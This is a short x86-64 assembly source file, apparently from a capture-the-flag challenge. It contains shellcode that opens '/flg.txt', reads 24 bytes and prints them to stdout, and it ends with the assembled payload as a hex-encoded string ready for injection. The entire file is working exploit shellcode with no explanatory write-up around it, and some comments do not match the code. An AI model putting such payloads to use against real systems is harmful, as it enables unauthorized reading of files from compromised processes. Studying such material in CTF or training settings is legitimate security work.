global _start

section .text
_start:
    ; push './flg.txt\x00'
    push rax              ; push NULL string terminator
    mov rdi, '/flg.txt' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    ;xor rsi, rsi          ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    xor rax, rax          ; read syscall number
    mov dl, 24         ; size to read
    syscall

    ; write output
    xor rax, rax
    mov al, 1          ; write syscall
    xor rdi, rdi
    mov dil, 1          ; set fd to stdout
    mov dl, 24         ; size to read
    syscall

    ; exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall

; shellcode : 5048bf2f666c672e74787457b0024889e70f05488d374889c74831c0b2180f054831c0b0014831ff40b701b2180f054831c0b03c4831ff0f05